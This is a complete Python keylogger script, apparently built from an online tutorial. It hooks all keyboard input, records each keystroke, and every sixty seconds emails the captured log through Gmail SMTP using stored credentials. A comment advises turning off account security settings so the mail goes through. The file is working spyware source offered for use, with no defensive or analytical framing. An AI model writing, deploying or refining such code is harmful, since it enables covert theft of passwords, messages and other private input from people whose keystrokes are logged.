import smtplib as smtp
import keyboard as kb
import miscFuncs as mf
import json
from threading import Timer
from datetime import datetime as dt
# https://www.thepythoncode.com/article/write-a-keylogger-python
# Disable 'Enable' and 2FA on google acc

with open('./creds.json') as f:
    creds = json.load(f)


report_interval = 60 # Seconds
email_address   = creds["email_address"]
email_pw        = creds["email_pw"]


class Keylogger:
    def __init__(self, interval, report_method='email'):
        self.report_method = report_method
        self.interval      = interval
        self.log           = ''

        self.start_dt      = dt.now()
        self.end_dt        = dt.now()

    def callBack(self, event):
        name = event.name

        if len(name) > 1:  # if not a char
            keyboardnames = ['decimal', 'up', 'down', 'left', 'right', 'end', 'shift',
                             'ctrl', 'alt', 'caps_lock', 'tab', 'backspace',
                             'delete', 'insert', 'page_down', 'page_up', 'home']

            if name == 'space':
                name = ' '

            elif name == 'enter':
                name = '\n'

            elif name in keyboardnames:
                name = f'<{name}>'

        self.log += name

    def log2TextFile(self):
        with open(f'{self.filename}.txt', 'w') as f:
            print(self.log, file=f)
        input(f'File {self.filename} has been saved to the local directory...')

    def start(self):
        self.start_dt = dt.now()
        kb.on_release(callback=self.callBack)
        self.report()
        kb.wait()

    def report(self):
        if self.log:
            self.end_dt = dt.now()
            self.updateFileName()

            if self.report_method == 'email':
                self.sendMail(email_address, email_pw, self.log)
            elif self.report_method == 'file':
                self.log2TextFile()

            self.start_dt = dt.now()
        self. log = ''
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def sendMail(self, email, pw, message):
        message = mf.addEmailSubject2Message([self.start_dt, self.end_dt], message)

        server = smtp.SMTP(host='smtp.gmail.com', port=587)
        server.starttls()  # Use transport layer security when connecting
        server.login(email, pw)
        server.sendmail(email, email, message)  # 1. To-email 2. From-email
        server.quit()

    def updateFileName(self):
        self.filename = f'Keylog {mf.datetimeList2String([self.start_dt, self.end_dt])}'


if __name__ == "__main__":
    keylogger = Keylogger(interval=report_interval, report_method="email")
    keylogger.start()